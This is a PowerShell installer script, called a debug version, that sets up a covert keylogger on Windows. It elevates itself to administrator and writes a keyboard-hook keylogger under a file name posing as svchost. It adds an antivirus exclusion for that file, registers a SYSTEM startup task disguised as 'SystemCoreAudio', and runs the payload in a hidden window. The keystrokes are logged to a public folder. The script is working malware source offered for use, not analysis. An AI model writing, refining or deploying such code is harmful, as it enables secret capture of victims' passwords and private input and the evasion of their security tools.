# This is a debug version of the installer. It modifies the scheduled task
# to log all output and errors to a file for troubleshooting.

# Step 1: Demand and Ensure Administrator Privileges
# ================================================================
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb RunAs -ArgumentList $arguments
    exit
}

# Step 2: Define and Create the Keylogger Payload
# =====================================================
$payloadPath = "C:\Users\Public\svchost13117.ps1"
$logFile = "C:\Users\Public\key_log.txt"
$debugLog = "C:\Users\Public\debug_log.txt"

# The keylogger payload remains the same.
$keyloggerScript = @"
`$logFile = "$logFile"
`$timeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Add-Content -Path `$logFile -Value "`r`n--- Log Session Started: `$timeStamp ---`r`n" -ErrorAction SilentlyContinue
`$signature = '
    using System; using System.Runtime.InteropServices; using System.Text;
    namespace Win32 {
        public static class User32 {
            public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
            [DllImport("user32.dll", SetLastError=true)] public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
            [DllImport("user32.dll", SetLastError=true)] public static extern bool UnhookWindowsHookEx(IntPtr hhk);
            [DllImport("user32.dll", SetLastError=true)] public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        }
        public static class Kernel32 { [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr GetModuleHandle(string mod); }
    }'
Add-Type -TypeDefinition `$signature
Add-Type -AssemblyName System.Windows.Forms
`$callback = {
    param(`$nCode, `$wParam, `$lParam)
    if (`$nCode -ge 0 -and `$wParam -eq 0x0100) {
        `$keyName = ([System.Windows.Forms.Keys]([System.Runtime.InteropServices.Marshal]::ReadInt32(`$lParam))).ToString()
        [System.IO.File]::AppendAllText(`$script:logFile, "`$keyName ")
    }
    return [Win32.User32]::CallNextHookEx(`$hook, `$nCode, `$wParam, `$lParam)
}
`$hook = [Win32.User32]::SetWindowsHookEx(13, `$callback, [Win32.Kernel32]::GetModuleHandle([System.Diagnostics.Process]::GetCurrentProcess().MainModule.ModuleName), 0)
if (`$hook -eq [IntPtr]::Zero) {
    # If the hook fails, throw an error to be caught in the debug log.
    throw "Failed to set keyboard hook. It's likely a permission or session issue."
}
try { while (`$true) { [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 100 } }
finally { [Win32.User32]::UnhookWindowsHookEx(`$hook) }
"@
Set-Content -Path $payloadPath -Value $keyloggerScript -Force

# Step 3: Add Windows Security Exclusion for the Payload
# ==========================================================
Add-MpPreference -ExclusionPath $payloadPath

# Step 4: Create a Persistent Scheduled Task for DEBUGGING
# ==================================================
# The command is changed to redirect all output (`*`) and errors to the debug_log.txt file.
$debugCommand = "powershell.exe -ExecutionPolicy Bypass -File `"$payloadPath`" *> `"$debugLog`""
$taskAction = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $debugCommand"

$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskPrincipal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -RunLevel 'Highest'
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName 'SystemCoreAudio' -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force

# Step 5: Start the Keylogger Immediately (for testing the payload)
# ===============================================================
$startArguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`""
Start-Process -FilePath 'powershell.exe' -ArgumentList $startArguments

Write-Host "✅ Debug installer finished. Please reboot to capture the startup log."
